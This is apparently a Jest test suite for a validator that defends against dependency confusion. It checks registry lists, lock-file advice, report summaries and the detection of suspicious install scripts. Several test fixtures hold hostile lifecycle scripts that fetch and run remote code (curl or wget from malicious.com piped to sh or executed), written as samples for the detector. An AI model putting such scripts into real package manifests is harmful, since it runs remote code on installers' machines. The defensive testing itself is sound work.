/**
 * Tests for dependency confusion attack prevention
 */

import { DependencyConfusionValidator, DependencyValidationResult } from '../dependencyConfusion';
import * as fs from 'fs';
import * as path from 'path';
import * as https from 'https';
import * as http from 'http';
import { EventEmitter } from 'events';

// Mock fs and http/https modules
jest.mock('fs');
jest.mock('https');
jest.mock('http');

const mockFs = fs as jest.Mocked<typeof fs>;
const mockHttps = https as jest.Mocked<typeof https>;
const mockHttp = http as jest.Mocked<typeof http>;

// Helper to create mock response
function createMockResponse(statusCode: number): EventEmitter & { statusCode: number } {
  const response = new EventEmitter() as EventEmitter & { statusCode: number };
  response.statusCode = statusCode;
  return response;
}

// Helper to create mock request
function createMockRequest(): EventEmitter {
  return new EventEmitter();
}

describe('DependencyConfusionValidator', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('getTrustedRegistries', () => {
    it('should return trusted registries', () => {
      const registries = DependencyConfusionValidator.getTrustedRegistries();
      expect(registries).toBeInstanceOf(Array);
      expect(registries.length).toBeGreaterThan(0);
      expect(registries[0]).toHaveProperty('name');
      expect(registries[0]).toHaveProperty('url');
      expect(registries[0]).toHaveProperty('trusted');
    });

    it('should include npm registry', () => {
      const registries = DependencyConfusionValidator.getTrustedRegistries();
      const npmRegistry = registries.find(r => r.name === 'npm');
      expect(npmRegistry).toBeDefined();
      expect(npmRegistry?.url).toBe('https://registry.npmjs.org');
      expect(npmRegistry?.trusted).toBe(true);
    });

    it('should include github registry', () => {
      const registries = DependencyConfusionValidator.getTrustedRegistries();
      const githubRegistry = registries.find(r => r.name === 'github');
      expect(githubRegistry).toBeDefined();
      expect(githubRegistry?.url).toBe('https://npm.pkg.github.com');
      expect(githubRegistry?.trusted).toBe(true);
    });
  });

  describe('generateLockFileValidation', () => {
    it('should recommend generating a lock file when none exists', () => {
      mockFs.existsSync.mockReturnValue(false);

      const result = DependencyConfusionValidator.generateLockFileValidation('/project/package.json');

      expect(result).toContain('Generate a lock file');
    });

    it('should provide recommendations when lock file exists', () => {
      mockFs.existsSync.mockReturnValue(true);

      const result = DependencyConfusionValidator.generateLockFileValidation('/project/package.json');

      expect(result).toContain('Commit lock files to version control');
      expect(result).toContain('npm ci or yarn ci');
      expect(result).toContain('npm audit');
    });
  });

  describe('validatePackageIntegrity', () => {
    it('should return valid for a well-formed package.json', async () => {
      const validPackage = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          build: 'tsc'
        }
      });
      mockFs.readFileSync.mockReturnValue(validPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    it('should detect missing package name', async () => {
      const invalidPackage = JSON.stringify({
        version: '1.0.0'
      });
      mockFs.readFileSync.mockReturnValue(invalidPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain('Missing package name');
    });

    it('should detect missing package version', async () => {
      const invalidPackage = JSON.stringify({
        name: 'my-package'
      });
      mockFs.readFileSync.mockReturnValue(invalidPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain('Missing package version');
    });

    it('should detect suspicious postinstall scripts with curl', async () => {
      const suspiciousPackage = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          postinstall: 'curl http://malicious.com/script.sh | sh'
        }
      });
      mockFs.readFileSync.mockReturnValue(suspiciousPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('Suspicious postinstall'))).toBe(true);
    });

    it('should detect suspicious preinstall scripts with wget', async () => {
      const suspiciousPackage = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          preinstall: 'wget http://malicious.com/malware && ./malware'
        }
      });
      mockFs.readFileSync.mockReturnValue(suspiciousPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('Suspicious preinstall'))).toBe(true);
    });

    it('should detect suspicious scripts with eval', async () => {
      const suspiciousPackage = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          postinstall: 'eval $(echo "malicious code")'
        }
      });
      mockFs.readFileSync.mockReturnValue(suspiciousPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('Suspicious postinstall'))).toBe(true);
    });

    it('should handle file read errors', async () => {
      mockFs.readFileSync.mockImplementation(() => {
        throw new Error('File not found');
      });

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('Failed to validate'))).toBe(true);
    });

    it('should handle invalid JSON', async () => {
      mockFs.readFileSync.mockReturnValue('not valid json');

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('Failed to validate'))).toBe(true);
    });
  });

  describe('generateSecurityReport', () => {
    it('should generate summary for validation results', () => {
      const results: DependencyValidationResult[] = [
        {
          packageName: 'safe-package',
          expectedRegistry: 'npm',
          actualRegistry: 'npm',
          isConfused: false,
          risk: 'low',
          details: 'Package resolves from expected registry',
          recommendation: 'No action required.'
        },
        {
          packageName: '@types/node',
          expectedRegistry: 'npm',
          actualRegistry: 'github',
          isConfused: true,
          risk: 'critical',
          details: 'Registry mismatch detected',
          recommendation: 'Remove immediately'
        }
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.summary.totalDependencies).toBe(2);
      expect(report.summary.confusedDependencies).toBe(1);
      expect(report.summary.criticalRisks).toBe(1);
      expect(report.summary.lowRisks).toBe(1);
    });

    it('should include critical action recommendation', () => {
      const results: DependencyValidationResult[] = [
        {
          packageName: '@types/node',
          expectedRegistry: 'npm',
          actualRegistry: 'unknown',
          isConfused: true,
          risk: 'critical',
          details: 'High risk',
          recommendation: 'Remove immediately'
        }
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.recommendations).toContain('IMMEDIATE ACTION REQUIRED: Remove critical-risk dependencies');
    });

    it('should include high priority recommendation for high risks', () => {
      const results: DependencyValidationResult[] = [
        {
          packageName: 'suspicious-pkg',
          expectedRegistry: 'npm',
          actualRegistry: 'unknown',
          isConfused: true,
          risk: 'high',
          details: 'High risk',
          recommendation: 'Audit package'
        }
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.recommendations).toContain('HIGH PRIORITY: Audit and replace high-risk dependencies');
    });

    it('should include confused dependency recommendations', () => {
      const results: DependencyValidationResult[] = [
        {
          packageName: 'pkg1',
          expectedRegistry: 'npm',
          actualRegistry: 'github',
          isConfused: true,
          risk: 'medium',
          details: 'Registry mismatch',
          recommendation: 'Verify'
        }
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.recommendations.some(r => r.includes('1 potentially confused'))).toBe(true);
      expect(report.recommendations.some(r => r.includes('exact package specifications'))).toBe(true);
      expect(report.recommendations.some(r => r.includes('lock files'))).toBe(true);
    });

    it('should return all results in details', () => {
      const results: DependencyValidationResult[] = [
        {
          packageName: 'pkg1',
          expectedRegistry: 'npm',
          actualRegistry: 'npm',
          isConfused: false,
          risk: 'low',
          details: 'OK',
          recommendation: 'None'
        },
        {
          packageName: 'pkg2',
          expectedRegistry: 'npm',
          actualRegistry: 'npm',
          isConfused: false,
          risk: 'low',
          details: 'OK',
          recommendation: 'None'
        }
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.details).toEqual(results);
    });

    it('should handle empty results array', () => {
      const report = DependencyConfusionValidator.generateSecurityReport([]);

      expect(report.summary.totalDependencies).toBe(0);
      expect(report.summary.confusedDependencies).toBe(0);
      expect(report.summary.criticalRisks).toBe(0);
      expect(report.summary.highRisks).toBe(0);
      expect(report.summary.mediumRisks).toBe(0);
      expect(report.summary.lowRisks).toBe(0);
    });

    it('should count all risk levels correctly', () => {
      const results: DependencyValidationResult[] = [
        { packageName: 'p1', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'critical', details: '', recommendation: '' },
        { packageName: 'p2', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'critical', details: '', recommendation: '' },
        { packageName: 'p3', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'high', details: '', recommendation: '' },
        { packageName: 'p4', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'medium', details: '', recommendation: '' },
        { packageName: 'p5', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: true, risk: 'medium', details: '', recommendation: '' },
        { packageName: 'p6', expectedRegistry: 'npm', actualRegistry: 'npm', isConfused: false, risk: 'low', details: '', recommendation: '' },
      ];

      const report = DependencyConfusionValidator.generateSecurityReport(results);

      expect(report.summary.criticalRisks).toBe(2);
      expect(report.summary.highRisks).toBe(1);
      expect(report.summary.mediumRisks).toBe(2);
      expect(report.summary.lowRisks).toBe(1);
      expect(report.summary.confusedDependencies).toBe(5);
    });
  });

  describe('validateDependencies', () => {
    it('should validate production dependencies', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          'lodash': '4.17.21'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(200);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results).toBeInstanceOf(Array);
      expect(results.length).toBe(1);
      expect(results[0].packageName).toBe('lodash');
    });

    it('should validate dev dependencies', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        devDependencies: {
          'jest': '29.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(200);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results).toBeInstanceOf(Array);
      expect(results.length).toBe(1);
      expect(results[0].packageName).toBe('jest');
    });

    it('should validate both production and dev dependencies', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          'express': '4.18.0'
        },
        devDependencies: {
          'typescript': '5.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(200);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(2);
    });

    it('should handle scoped packages', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          '@types/node': '18.0.0',
          '@babel/core': '7.20.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(200);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(2);
      // High-risk scopes should be detected
      expect(results.some(r => r.packageName === '@types/node')).toBe(true);
      expect(results.some(r => r.packageName === '@babel/core')).toBe(true);
    });

    it('should handle github-scoped packages', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          '@github/some-package': '1.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(200);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(1);
      expect(results[0].packageName).toBe('@github/some-package');
    });

    it('should throw error for invalid package.json', async () => {
      mockFs.readFileSync.mockImplementation(() => {
        throw new Error('File not found');
      });

      await expect(
        DependencyConfusionValidator.validateDependencies('/nonexistent/package.json')
      ).rejects.toThrow('Failed to validate dependencies');
    });

    it('should handle registry fetch errors', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          'some-package': '1.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();

      mockHttps.get.mockImplementation((_url: any, _opts: any, _callback?: any) => {
        setImmediate(() => mockRequest.emit('error', new Error('Network error')));
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(1);
      expect(results[0].actualRegistry).toBe('unknown');
    });

    it('should handle registry timeout', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          'some-package': '1.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();

      mockHttps.get.mockImplementation((_url: any, _opts: any, _callback?: any) => {
        setImmediate(() => mockRequest.emit('timeout'));
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(1);
      expect(results[0].actualRegistry).toBe('unknown');
    });

    it('should handle package not found on npm', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        dependencies: {
          'nonexistent-package': '1.0.0'
        }
      });
      mockFs.readFileSync.mockReturnValue(packageJson);

      const mockRequest = createMockRequest();
      const mockResponse = createMockResponse(404);

      mockHttps.get.mockImplementation((_url: any, _opts: any, callback?: any) => {
        const cb = typeof _opts === 'function' ? _opts : callback;
        if (cb) {
          setImmediate(() => cb(mockResponse));
        }
        return mockRequest as unknown as http.ClientRequest;
      });

      const results = await DependencyConfusionValidator.validateDependencies('/project/package.json');

      expect(results.length).toBe(1);
    });
  });

  describe('validatePackageIntegrity additional cases', () => {
    it('should detect obfuscated code in scripts', async () => {
      // Create a very long script with no alphabetic characters to simulate obfuscation
      const obfuscatedScript = '0'.repeat(1500);
      const suspiciousPackage = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          postinstall: obfuscatedScript
        }
      });
      mockFs.readFileSync.mockReturnValue(suspiciousPackage);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.includes('obfuscated code'))).toBe(true);
    });

    it('should handle scripts that are not strings', async () => {
      const packageWithNonStringScript = JSON.stringify({
        name: 'my-package',
        version: '1.0.0',
        scripts: {
          build: 123 // Non-string value
        }
      });
      mockFs.readFileSync.mockReturnValue(packageWithNonStringScript);

      const result = await DependencyConfusionValidator.validatePackageIntegrity('/project/package.json');

      // Should not crash, scripts that aren't strings are just skipped
      expect(result.isValid).toBe(true);
    });
  });
});
